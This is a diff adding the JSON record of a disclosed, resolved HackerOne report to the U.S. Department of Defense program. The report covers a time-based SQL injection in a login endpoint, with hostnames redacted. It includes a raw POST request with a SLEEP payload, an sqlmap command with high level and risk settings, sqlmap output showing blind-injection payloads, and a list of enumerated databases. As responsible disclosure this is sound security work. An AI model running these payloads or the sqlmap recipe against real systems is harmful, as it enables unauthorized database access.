@@ -1,0 +1,118 @@
+{
+  "id": 1627970,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjI3OTcw",
+  "url": "https://hackerone.com/reports/1627970",
+  "title": "time based SQL injection at [https://███] [HtUS]",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2022-07-06T14:01:43.617Z",
+  "submitted_at": "2022-07-06T14:01:43.711Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "malcolmx",
+    "url": "/malcolmx",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/043/962/0448fa629279eb47ceced2514304c8256b112624_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-09-14T21:10:48.278Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-09-11T11:24:35.686Z",
+  "team_member_agreed_on_going_public_at": "2022-09-14T21:10:48.157Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello,\n\n##Summary\n\nwhile doing test on [`www.█████`](http://www.████████/) I’ve found that the endpoint at `/olc/setlogin.php` is vulnerable with SQL injection vulnerability\n\n##Vulnerable parameters \n\n- username\n- password\n\n##POC\n\n- using time based to verify , submit the below request\n\n```jsx\nPOST /olc/setlogin.php HTTP/1.1\nHost: www.██████\nCookie: UsafNoticeConsent=1; PHPSESSID=5r61rj890ogju3dvb5ptup2mn1; session=expiry=1657062712923491\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 74\nOrigin: https://www.██████████\nReferer: https://www.████/olc/sethomepage.html\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nTe: trailers\nConnection: close\n\n██████████'%2b(select*from(select(sleep(5)))a)%2b'&█████████\n```\n\n- we can see that the response time will be `5`\n\n{██████████]\n\n\n\n- sqlmap run command\n\n```jsx\npython3 sqlmap.py --level=5 --risk=3 --tamper=space2comment --random-agent  -u https://█████████ --data=\"████████&██████\" -p username --dbms=mysql \n```\n\n- if you got message `got a 302 redirect to '[https://www.█████:443/olc/sethomepage.html](https://www.████████/olc/sethomepage.html)'. Do you want to follow? [Y/n] n`\n\npress `n` to not follow the redirection \n\n- we can se that our target parameter is vulnerable\n\n```jsx\nPOST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n\nsqlmap identified the following injection point(s) with a total of 586 HTTP(s) requests:\n---\nParameter: username (POST)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause\n    Payload: username=-1559' OR 4924=4924 OR 'XiUq'='JgnT&██████████\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: █████' AND (SELECT 9612 FROM (SELECT(SLEEP(5)))xSGk) OR 'CPXv'='aouS&██████\n---\n[23:27:33] [WARNING] changes made by tampering scripts are not included in shown payload content(s)\n[23:27:33] [INFO] the back-end DBMS is MySQL\nweb application technology: Apache\nback-end DBMS: MySQL >= 5.0.12 (MariaDB fork)\n[23:27:34] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/www.█████████'\n\n[*] ending @ 23:27:34 /2022-07-05/\n```\n\n███\n\n- add `--dbs` will back to us with the databases\n\n```jsx\navailable databases [13]:\n[] ███\n[] ██████mobile\n[] GET\n[] information_schema\n[] LEAM\n[] leat\n[] LEV\n[] mysql\n[] performance_schema\n[] SET\n[] test\n[] testadmin\n[*] testusers\n```\n\n## Impact\n\nattacker is able to get the database",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 20,
+  "voters": [
+    "0xm5awy",
+    "m4khn0",
+    "deckardcipher",
+    "zy9ard3",
+    "shreyaschavhan",
+    "c4l33ph4",
+    "khizer47",
+    "sa1tama0",
+    "paulochoupina",
+    "shivammusic",
+    "and 10 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
